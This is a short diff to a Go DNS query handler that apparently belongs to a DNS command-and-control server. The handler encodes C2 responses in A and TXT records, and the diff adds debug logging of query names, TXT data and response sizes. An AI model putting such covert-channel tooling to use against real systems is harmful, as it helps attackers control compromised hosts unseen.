@@ -223,6 +223,10 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 			// Create C2 response
 			var answers []DNSResourceRecord
 
+			// Debug: Log the query name format
+			logf("[DEBUG] Query Name (original): '%s' (len=%d)", q.Name, len(q.Name))
+			logf("[DEBUG] Query Name (processed): '%s' (len=%d)", qname, len(qname))
+
 			switch q.Type {
 			case 1: // A record - encode simple responses in IP
 				if c2Response == "ACK" {
@@ -292,10 +296,16 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 					TTL:   1,
 					RData: txtData,
 				})
+
+				// Debug: Log the TXT record details
+				logf("[DEBUG] TXT RData length: %d bytes", len(txtData))
+				logf("[DEBUG] TXT RData hex: %x", txtData)
 			}
 
 			respMsg := buildResponse(msg, answers, 0)
-			return serializeMessage(respMsg), nil
+			serialized := serializeMessage(respMsg)
+			logf("[DEBUG] Response packet length: %d bytes", len(serialized))
+			return serialized, nil
 		}
 	}
 
